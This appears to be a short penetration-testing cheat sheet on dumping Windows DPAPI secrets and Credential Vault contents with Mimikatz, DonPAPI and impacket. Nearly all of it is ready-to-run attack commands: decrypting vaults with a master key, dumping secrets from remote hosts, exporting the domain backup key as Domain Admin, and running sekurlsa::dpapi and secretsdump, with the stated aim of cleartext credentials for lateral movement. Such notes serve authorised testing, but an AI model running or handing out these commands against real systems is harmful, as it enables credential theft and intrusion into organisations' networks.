# Extract DPAPI and Credentials Vault

## Tools: Mimikatz , DonPAPI , impacket-secretsdump

Decipher Vault with Master Key

    dpapi.py vault -vcrd <vault_file> -vpol <vault_policy_file> -key <master_key>

Dump all secrets on a remote machine

    DonPAPI.py domain.local/user1:password@<target>

Extract the domain backup key with a Domain Admin

    dpapi.py backupkeys --export -t domain.local/user1:password@<DC_IP>

Dump all user secrets with the backup key

    DonPAPI.py -pvk domain_backupkey.pvk domain.local/user1:password@<targets>

#### 1) Mimikatz

    mimikatz.exe "sekurlsa::dpapi"

#### 2) impacket-secretsdump

    impacket-secretsdump DOMAIN/USER:PASSWORD@IP

#### 3) DonPAPI

    DonPAPI.py DOMAIN/USER:PASSWORD@TARGET

### Dumping DPAPI will give us cleartext credentials so that we can laterally move within the network
